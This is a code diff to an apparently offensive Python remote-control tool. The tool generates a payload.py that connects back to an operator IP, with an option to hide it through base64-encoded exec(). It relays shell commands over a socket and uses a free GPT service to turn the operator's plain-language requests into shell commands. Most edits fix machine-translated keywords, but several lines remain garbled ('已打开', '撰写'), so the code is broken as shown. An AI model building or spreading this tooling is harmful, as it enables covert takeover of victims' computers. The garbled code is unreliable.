@@ -76,12 +76,12 @@ def get_local_ipv4():
 # 获取本机内网的IPv4地址
 local_ipv4 = get_local_ipv4()
 
-if len(sys.argv)>1 和 sys.argv[1]!="--help" 和 sys.argv[1]!="-create" 和 sys.argv[1]!="-ip":
+if len(sys.argv)>1 and sys.argv[1]!="--help" and sys.argv[1]!="-create" and sys.argv[1]!="-ip":
      sys.exit(0)
 
 localhost_ip = "127.0.0.1"
 
-if len(sys.argv)>2 和 sys.argv[1]=="-ip":
+if len(sys.argv)>2 and sys.argv[1]=="-ip":
     localhost_ip = sys.argv[2]
     print("当前启动ip: "+ localhost_ip)
 
@@ -98,7 +98,7 @@ if len(sys.argv)>1:
      sys.exit(0)
 
 if len(sys.argv)>2:
-     if sys.argv[1]=="-create" 和 sys.argv[2]!="-protect":
+     if sys.argv[1]=="-create" and sys.argv[2]!="-protect":
         with 已打开('payload.py', 'w') as file:
          file.撰写(payload.replace("payload_ip",sys.argv[2]))
         sys.exit(0)
@@ -106,18 +106,18 @@ if len(sys.argv)>2:
 
 # 获取命令行参数
 if len(sys.argv)>1:
-    if len(sys.argv)>2 和 sys.argv[2]=="-protect":
+    if len(sys.argv)>2 and sys.argv[2]=="-protect":
          if len(sys.argv)>3:
              payload = payload.replace("payload_ip",sys.argv[3])
          else:
              payload = payload.replace("payload_ip",local_ipv4)
-         payload = base64.b64encode(payload.encode('utf-8'))。decode('utf-8')
+         payload = base64.b64encode(payload.encode('utf-8')).decode('utf-8')
          with 已打开('payload.py', 'w') as file:
           file.撰写(f"p='''{payload}'''\nimport base64\nexec(base64.b64decode(p).decode('utf-8'))")
          sys.exit(0)
 
 
-if len(sys.argv)==2 和 sys.argv[1]=="-create":
+if len(sys.argv)==2 and sys.argv[1]=="-create":
     with 已打开('payload.py', 'w') as file:
      file.撰写(payload.replace("payload_ip",local_ipv4))
     sys.exit(0)
@@ -139,7 +139,7 @@ def control_send_message(message):
     send_message(sock, message)
 
 def receive_message(sock):
-    data = sock.recv(1024)。decode()
+    data = sock.recv(1024).decode()
     return data
 
 def handle_server_response():
@@ -165,7 +165,7 @@ async def main():
         if shell == 'exit':
             os._exit(0)
         prompt = shell+"，你只需要回答相应的shell指令，不要附加其他内容，如果我说的是ls，你就回复ls"
-        resp = await getattr(freeGPT, "gpt3")。Completion。创建(prompt)
+        resp = await getattr(freeGPT, "gpt3").Completion.create(prompt)
         # print(f"{resp}\n发送中.....")
         control_send_message(resp)
         # print(f"发送成功")
